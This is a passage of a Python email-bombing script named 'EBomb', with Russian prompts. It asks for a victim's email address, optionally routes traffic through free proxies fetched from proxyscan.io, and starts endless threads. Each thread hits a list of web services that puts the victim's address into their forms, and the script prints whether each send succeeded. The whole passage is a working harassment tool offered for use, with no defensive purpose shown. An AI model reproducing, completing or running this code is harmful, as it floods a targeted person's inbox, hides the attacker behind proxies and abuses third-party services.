ua = UserAgent()

global spam_id, headers
spam_id = input('Введите Email для спама: ')
proxy = input('Использовать ли прокси? (y/n): ')
global useproxy
if proxy == 'y' or proxy == 'yes' or proxy == 'д' or proxy == 'да':
	useproxy = True
else:
	useproxy = False


headers = {'User-Agent': ua.random}
def send(url):
	while 1:
		color = '\033[0m'
		try:
			ptype = url.split('/')[0][0:-1]
			if ptype == None:
				ptype = 'http'
			if useproxy:
				proxy = (requests.get(f"https://www.proxyscan.io/api/proxy?format=txt&type={ptype}").content.decode('utf-8').split()[0], ' с использованием прокси - ')
			else:
				proxy = ('', '')
			
			proxies = {ptype: proxy[0]}
			r = requests.get(url.format(spam_id), headers=headers, proxies=proxies)
			if r.status_code > 300:
				color = '\033[31mНе '
			else:
				color = '\033[32m'
			restex = 'Отправлено с ' + url.format(spam_id).split('/')[2] + f' на {spam_id}'
			
		except Exception:
			exit()
		print(str(color + restex + proxy[1] + proxy[0] + ' ' + str(r)))

cmd('clear')
cmd('figlet EBomb')

while 1:
	for i in service:
		t = Thread(target=send, args=(i,))
		t.start()
